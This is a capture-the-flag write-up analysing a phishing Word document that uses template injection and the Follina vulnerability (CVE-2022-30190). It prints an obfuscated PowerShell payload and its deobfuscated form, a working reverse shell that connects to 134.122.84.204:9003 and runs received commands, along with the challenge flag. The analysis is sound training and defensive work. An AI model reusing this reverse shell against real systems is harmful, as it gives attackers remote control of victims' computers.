# Phishing

## Write-up

According to the description and the name, we know this was a phishing attack employing an office word document; typically, malicious macros or template injection are used in phishing with word.

We don't notice any macros in the provided document, but we do see what appears to be template injection and a suspicious link `http://134.122.84.204/rtf-word-template.html` standing out in `word/_rels/document.xml.rels`.

By googling the IOCs or simply staying in tune with Infosec news a fresh zero day vulnerability was discovered in the wild in the beginning of summer 2022 dubbed [CVE 2022-30190 (follina)](https://msrc-blog.microsoft.com/2022/05/30/guidance-for-cve-2022-30190-microsoft-support-diagnostic-tool-vulnerability/)

> The link is not up, but you can find the [rtf-word-template.html](rtf-word-template.html) in the repo.

According to the vulnerability specification the attacker is trying to execute this script:

```powershell
&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4sIAA9iSGM{0}A5VVTW/jNh{0}9+1cMDLWREJtQvDm0AbKoq80WAbK7xiptDoaB0NQ4VkOTLknFNhL/95IS9eE4Qbs62BJn+Pj45{1}25KAQzuRTwB5rhHc4Zz1EY6D33wD7BhsElfMXN8Nv8b2QGhre7NX6lK7SDhtj8pMyvk8mfGj/h{1}hbcJ'+'AozG8kp1xYiMKrAJmui5HZHXmXY8c5Indvb9xY1xbXcoLJflh2U8QlVdBVW79PUqFw8zI'+'JErlZUZIPD0VRzJsWrwU9yI7ikWTkaeUwlGWoNXo{0}VzAqOjuBvYQRVSr6AsF4Ghv{1}P9Oe5yPpRGazmlXN5r{1}0KVHbyNN3Z9xVxqqWSPaLR5Jatb3zG7Nc4/nA8kWhDlXHr+pXLq{0}/RZSdvzBiujQW'+'syhFWVPbv0VX4hErjMeMGulPyt5{1}nE79Q/+zDOTkbjc{1}v52QUn/cHbiN+9V6loDYK6crRrd{0}JdVpajlmaLcGqQBU/Z5a+r0eHndY8rcHeIYisULnZkbRODf36{1}2BhXYW'+'D8Dm4teh7GFIN04M533ElDSaoTL7IGTX4F+V5Rp31Esr5nLLHWRS9QYeM{0}7N0vnWTxvo9aQJRcD7oG67PRn3PpwvX6NTusyvkdL4zOJ3NAvfvDBkTi2ufl5+e473XGkVWh8Opwa0hKJjMnNsvLsZpcn0dOf1/dzlh/87aVm40TFxjpUvk'+'HFQhhM0Gq06hrXX7cAoBiqcL9yVc45/aMVuoJsDkal2YN'+'n{1}vErneqfxhaSBMIvi'+'SMyW1XBhIpFpLVQpKYOwWc0kaFFrsJ8zI'+'vb{1}X3pReDnJnS4Nhu7FBPG{1}/yA2KB7Ps2'+'qhu6a6Rjnz0YypNT2dwYyGdLP44IA3PH+daz/os1RVlS8u5AoVcNMdNm9XSdk94cEpHpN5tdaDVSNHLtXiSjzi82q6tttrq3aDsu5baLHOOYRjkpeuqTXxHmoWVxwYQDyA4YB/BU{0}DER5JeOf0wu7Vavndh+DZ1KaTU+Mpr3qLYZqOOS{1}fNnxbl7mpRIci'+'jV9W0vemKebRvGNYHXwU++vjzGbzAt8IMK1Tw5jmAGkEpSA18{0}ieTFE7sf6n/jWSlhyMyoWbpo'+'h/'+'hpAXZOi'+'IBKiXVNJ4dLNZhXcYJ40hVGL3F4LL7YVtt2zs28P/ybwvzn47tGvbIr/Wcz7zQy+Yu9AePP9oTLjX6/ZTtWN9QXcO011Zq5Lq+q/yvdWZzzTe18/fVv8LuL+ys{0}AAA')-f'C','g')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
```

Deobfuscation in this challenge is as simple as removing `&` operator and echoing the result of the script

```powershell
function Get-Webclient
{
    $wc = New-Object -TypeName Net.WebClient
    $wc.UseDefaultCredentials = $true
    $wc.Proxy.Credentials = $wc.Credentials
    $wc
}
function powerfun
{
    Param(
    [String]$Command,
    [String]$Sslcon,
    [String]$Download
    )
    Process {
    $modules = @()
    if ($Command -eq "bind")
    {
        $listener = [System.Net.Sockets.TcpListener]9003
        $listener.start()
        $client = $listener.AcceptTcpClient()
    }
    if ($Command -eq "reverse")
    {
        $client = New-Object System.Net.Sockets.TCPClient("134.122.84.204",9003)
    }

    $stream = $client.GetStream()

    if ($Sslcon -eq "true")
    {
        $sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
        $sslStream.AuthenticateAsClient("134.122.84.204",$null,"tls12",$false)
        $stream = $sslStream
    }

    [byte[]]$bytes = 0..20000|%{0}
    $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) Microsoft Corporation. All rights reserved.`n`n")
    $stream.Write($sendbytes,0,$sendbytes.Length)

    if ($Download -eq "true")
    {
        $sendbytes = ([text.encoding]::ASCII).GetBytes("[+] Loading modules.`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)
        ForEach ($module in $modules)
        {
            (Get-Webclient).DownloadString($module)|Invoke-Expression
        }
    }

    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
    {
        $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
        $data = $EncodedText.GetString($bytes,0, $i)
        $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )

        $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
        $x = ($error[0] | Out-String)
        $error.clear()
        $sendback2 = $sendback2 + $x

        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
        $stream.Write($sendbyte,0,$sendbyte.Length)
        $stream.Flush()
    }
    $client.Close()
    if ($listener)
    {
    $listener.Stop()
    }
    }
}

powerfun -Command reverse
```

This was out of the box msfvenome powershell reverse shell connecting to "134.122.84.204:9003" by connecting to that port we see the following communication:

```
>$super_secret = 'IngeHack{N3ver_0p3n_5us_VV0rD_d0Cs_k1dd0}'
>whoami
<then the connection waits for a response
>msg $env:username I AM STRONG I AM SMARTER I AM BETTER
```

As you can see I was getting people's whoami outputs just to see how many people executed the script directly on their own personal computer ( ;) I know you people), people who used safe VM labs kudos to you.  
Don't execute stranger's scripts from the internet not even mind.
